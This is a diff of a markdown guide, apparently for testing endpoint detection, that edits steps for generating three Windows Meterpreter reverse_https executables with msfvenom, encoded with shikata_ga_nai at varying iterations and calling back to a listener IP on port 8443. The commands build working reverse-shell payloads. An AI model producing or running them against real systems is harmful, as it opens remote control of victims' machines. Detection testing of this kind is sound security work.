@@ -28,7 +28,7 @@ set HANDLERSSLCERT /root/.msf4/loot/20210526091350_default_93.184.216.34_93.184.
 
 ## Payload Generation
 
-Create 3 msfvenom payloads
+Create 3 msfvenom payloads (**make sure to change the lhost IP to your Kali system IP address**)
 
 ```
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 1 lport=8443 lhost=1.2.3.4 -b "\x00" -f exe -o test.exe
@@ -42,7 +42,7 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/s
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 30 lport=8443 lhost=1.2.3.4 -b "\x00\xff" -f exe -o test3.exe
 ```
 
-The command shoudl complete and output 3 testing executables. For the high interation payloads you may recieve an error as the paylod errors during the interation process, just rerun the command until you get a successful run.
+The command should complete and output 3 testing executables. For the high interation payloads you may recieve an error as the paylod errors during the interation process, just rerun the command until you get a successful run.
 
 ![output payload 1](https://raw.githubusercontent.com/blumirabrian/endpoint-detection-methology/main/msf/edr2.png "Payload 1")
 
